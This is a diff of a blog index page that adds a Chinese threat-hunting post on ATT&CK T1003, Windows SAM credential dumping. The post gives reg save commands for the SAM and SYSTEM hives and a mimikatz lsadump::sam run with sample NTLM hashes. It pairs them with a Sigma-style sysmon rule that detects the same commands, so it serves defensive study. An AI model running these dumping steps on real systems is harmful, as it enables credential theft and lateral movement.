@@ -179,6 +179,138 @@
             
 
   
+    <article id="post-Credential-Access-win-SAM-mimikatz" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class=" article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	      <a class="article-title" href="/2019/09/11/Credential-Access-win-SAM-mimikatz/" target="_blank">Credential-Access-win-SAM-mimikatz</a>
+        
+    </h1>
+  
+
+
+  
+  
+<a href="/2019/09/11/Credential-Access-win-SAM-mimikatz/" class="archive-article-date">
+        <time datetime="2019-09-11T02:18:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-11</time>
+</a>
+
+  
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="来自ATT-amp-CK的描述"><a href="#来自ATT-amp-CK的描述" class="headerlink" title="来自ATT&amp;CK的描述"></a>来自ATT&amp;CK的描述</h2><p>凭证获取是从操作系统和软件中获取登录信息和密码的过程，通常为HASH散列或明文密码。然后使用凭证进行横向移动访问其他系统。</p>
+<h3 id="SAM（Security-Accounts-Manager）"><a href="#SAM（Security-Accounts-Manager）" class="headerlink" title="SAM（Security Accounts Manager）"></a>SAM（Security Accounts Manager）</h3><p>SAM文件是一个存储主机本地账户信息的数据库文件，通常是”net user”能看到的用户。想要枚举SAM数据库，你需要系统（system）权限才能够进行操作。它可以在两种模式下工作：在线（使用SYSTEM用户或令牌）或离线（使用SYSTEM＆SAMhives或backup）。</p>
+<p>安全帐户管理器（SAM），往往是一个数据库文件在Windows XP中，Windows Vista中、Windows 7中、8.1和10存储用户的密码。它可用于验证本地和远程用户。从Windows 2000 SP4开始，Active Directory对远程用户进行身份验证。SAM使用加密措施来防止未经身份验证的用户访问系统。</p>
+<p>用户密码以散列格式存储在注册表配置单元中，可以是LM哈希，也可以是NTLM哈希。可以在此文件中找到%SystemRoot%/system32/config/SAM并安装此文件HKLM/SAM。LM哈希是一种受损的协议，已被NTLM哈希取代。可以将大多数Windows版本配置为在用户更改密码时禁用有效LM哈希的创建和存储。Windows Vista和更高版本的Windows默认禁用LM哈希。</p>
+<p>为了提高SAM数据库的安全性以防止脱机离线破解，Microsoft在Windows NT 4.0中引入了SYSKEY功能。启用SYSKEY后，SAM文件的磁盘副本将部分加密，以便SAM中存储的所有本地帐户的密码哈希值都使用密钥加密（通常也称为“SYSKEY”）。可以通过运行程序启用它。</p>
+<h2 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h2><p>你可以使用许多工具进行检索读取SAM文件：</p>
+<ul>
+<li>pwdump.exe</li>
+<li>Mimikatz</li>
+<li>gsecdump</li>
+<li>······</li>
+</ul>
+<p>或者，可以使用Reg从注册表中提取SAM文件信息：</p>
+<ul>
+<li>reg save HKLM\SYSTEM SystemBkup.hiv</li>
+<li>reg save HKLM\SAM SamBkup.hiv</li>
+</ul>
+<p>然后可以使用Creddump7或者hashcat在本地离线提取哈希值。</p>
+<p>你也可以选择直接备份这些文件：</p>
+<ul>
+<li>C:\Windows\System32\config\SYSTEM</li>
+<li>C:\Windows\System32\config\SAM</li>
+</ul>
+<p>值得注意的是：Rid 500账户是本地内置账户，Rid 501是来宾用户，用户账户以Rid 1000+开头。</p>
+<h2 id="检测日志"><a href="#检测日志" class="headerlink" title="检测日志"></a>检测日志</h2><p>sysmon日志</p>
+<h2 id="测试复现"><a href="#测试复现" class="headerlink" title="测试复现"></a>测试复现</h2><h3 id="攻击方法：本地导出sam、system文件，离线进行hash提取-administrator"><a href="#攻击方法：本地导出sam、system文件，离线进行hash提取-administrator" class="headerlink" title="攻击方法：本地导出sam、system文件，离线进行hash提取(administrator)"></a>攻击方法：本地导出sam、system文件，离线进行hash提取(administrator)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\me\Desktop&gt;reg save hklm\sam sam.hiv</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">C:\Users\me\Desktop&gt;reg save hklm\system system.hiv</span><br><span class="line">The operation completed successfully.</span><br><span class="line"></span><br><span class="line">mimikatz # lsadump::sam /sam:sam.hiv /system:system.hiv</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000003eb (1003)</span><br><span class="line">User : test</span><br><span class="line">  Hash NTLM: a2345375a47a92754e2505132aca194b</span><br><span class="line"></span><br><span class="line">RID  : 000003ec (1004)</span><br><span class="line">User : test2</span><br><span class="line">  Hash NTLM: f0873f3268072c7b1150b15670291137</span><br></pre></td></tr></table></figure>
+
+<h2 id="测试留痕"><a href="#测试留痕" class="headerlink" title="测试留痕"></a>测试留痕</h2><p>暂无</p>
+<h2 id="检测规则-思路"><a href="#检测规则-思路" class="headerlink" title="检测规则/思路"></a>检测规则/思路</h2><h3 id="攻击方法：本地导出sam、system文件，离线进行hash提取-administrator-1"><a href="#攻击方法：本地导出sam、system文件，离线进行hash提取-administrator-1" class="headerlink" title="攻击方法：本地导出sam、system文件，离线进行hash提取(administrator)"></a>攻击方法：本地导出sam、system文件，离线进行hash提取(administrator)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">title: 本地导出sam、system文件，离线进行hash提取(administrator)</span><br><span class="line">description: windows 7 模拟测试结果</span><br><span class="line">references: https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</span><br><span class="line">tags: ATT&amp;CK T1003</span><br><span class="line">status: experimental</span><br><span class="line">author: Mr liu</span><br><span class="line">logsource:</span><br><span class="line">​    product: windows</span><br><span class="line">​    service: sysmon</span><br><span class="line">detection:</span><br><span class="line">​    selection1:</span><br><span class="line">​        EventID: 1</span><br><span class="line">​        Image: &apos;C:\Windows\System32\reg.exe&apos;</span><br><span class="line">​        CommandLine: &apos;reg  save hklm\sam sam.hiv&apos;</span><br><span class="line">​    selection2:</span><br><span class="line">​        EventID: 1</span><br><span class="line">​        Image: &apos;Image: C:\Windows\System32\reg.exe&apos;</span><br><span class="line">​        CommandLine: &apos;reg  save hklm\system system.hiv&apos;</span><br><span class="line">​    timeframe: last 2m</span><br><span class="line">​    condition: selection1 and selection2</span><br><span class="line">level: high</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考推荐"><a href="#参考推荐" class="headerlink" title="参考推荐"></a>参考推荐</h2><p>MITRE-ATT&amp;CK-T1003：<a href="https://attack.mitre.org/techniques/T1003/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1003/</a></p>
+<p>pwdump7：<a href="http://passwords.openwall.net/b/pwdump/pwdump7.zip" target="_blank" rel="noopener">http://passwords.openwall.net/b/pwdump/pwdump7.zip</a></p>
+<p>powershell：<a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1</a></p>
+<p>mimikatz wiki：<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</a></p>
+<p>关于更多通过SAM数据库获取本地用户hash你可以参考：<a href="https://www.4hou.com/technology/10878.html" target="_blank" rel="noopener">https://www.4hou.com/technology/10878.html</a></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">终端日志分析</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">凭证获取</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/威胁狩猎//" class="article-tag-list-link color5">威胁狩猎</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2019/09/11/Credential-Access-win-SAM-mimikatz/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-T1003-sysmon" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -2556,23 +2688,11 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">终端日志分析</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">流量分析</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">终端日志分析，逃避追踪，威胁狩猎</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">凭证获取，威胁狩猎</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">威胁狩猎</a>
+                <a href="javascript:void(0)" class="js-tag color2">终端日志分析</a>
               </li>
              
               <li class="article-tag-list-item">
